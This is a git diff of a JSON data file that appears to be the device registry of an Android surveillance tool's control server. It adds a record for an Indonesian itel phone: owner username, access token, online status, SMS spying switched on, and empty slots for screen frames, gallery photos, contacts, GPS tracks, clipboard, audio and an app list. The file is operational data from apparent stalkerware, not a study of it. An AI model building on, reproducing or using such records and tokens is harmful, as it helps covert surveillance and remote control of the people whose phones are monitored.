@@ -30,5 +30,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_f75f0edf",
+    "deviceName": "HP-BUGV2-9679",
+    "ownerUsername": "gehgtg17",
+    "token": "074c70324689a6d895cd017b2b0059b6",
+    "lastSeen": 1776079404956,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-13T11:23:24.956Z",
+    "deviceInfo": {
+      "model": "ITEL itel P671L",
+      "androidVersion": "Android 14",
+      "battery": 83,
+      "network": "Seluler: Smartfren 100% untuk Indonesia",
+      "sim1": "Smartfren 100% untuk Indonesia",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
